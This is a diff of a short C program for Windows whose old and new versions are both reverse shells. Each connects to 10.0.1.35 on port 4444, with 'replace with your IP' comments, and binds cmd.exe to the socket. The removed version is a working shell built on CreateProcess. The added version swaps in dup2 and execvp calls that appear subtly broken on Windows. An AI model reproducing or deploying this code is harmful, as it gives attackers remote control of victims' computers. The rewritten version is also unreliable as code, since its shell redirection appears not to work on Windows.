@@ -1,46 +1,48 @@
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
 #include <winsock2.h>
 #include <windows.h>
-#include <stdlib.h>
-#include <stdio.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
-void ExecuteReverseShell() {
+int main() {
     WSADATA wsa;
     SOCKET sock;
     struct sockaddr_in server;
-    STARTUPINFO si;
-    PROCESS_INFORMATION pi;
+    char *ip = "10.0.1.35"; // Replace with the IP you want to connect to
+    int port = 4444;
 
     // Initialize Winsock
-    WSAStartup(MAKEWORD(2, 2), &wsa);
-
-    // Create socket
-    sock = socket(AF_INET, SOCK_STREAM, 0);
-    server.sin_addr.s_addr = inet_addr("10.0.1.35"); // Replace with your IP
-    server.sin_family = AF_INET;
-    server.sin_port = htons(4444); // Replace with your port
-
-    // Connect to the server
-    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
-        exit(1);
+    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
+        return 1;
     }
 
-    // Setup structures for creating a process
-    memset(&si, 0, sizeof(si));
-    si.cb = sizeof(si);
-    si.dwFlags = STARTF_USESTDHANDLES;
-    si.hStdInput = si.hStdOutput = si.hStdError = (HANDLE)sock;
+    // Create socket
+    if ((sock = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) {
+        return 1;
+    }
 
-    // Launch a shell
-    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
+    server.sin_family = AF_INET;
+    server.sin_addr.s_addr = inet_addr(ip);
+    server.sin_port = htons(port);
 
-    // Clean up
+    // Connect to server
+    if (connect(sock, (struct sockaddr *)&server, sizeof(server)) == SOCKET_ERROR) {
+        return 1;
+    }
+
+    // Redirect stdin, stdout, and stderr to socket
+    dup2(sock, 0);  // stdin
+    dup2(sock, 1);  // stdout
+    dup2(sock, 2);  // stderr
+
+    // Execute command shell
+    execvp("cmd.exe", NULL);
+
+    // Cleanup
     closesocket(sock);
     WSACleanup();
-}
 
-int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
-    ExecuteReverseShell();
     return 0;
 }
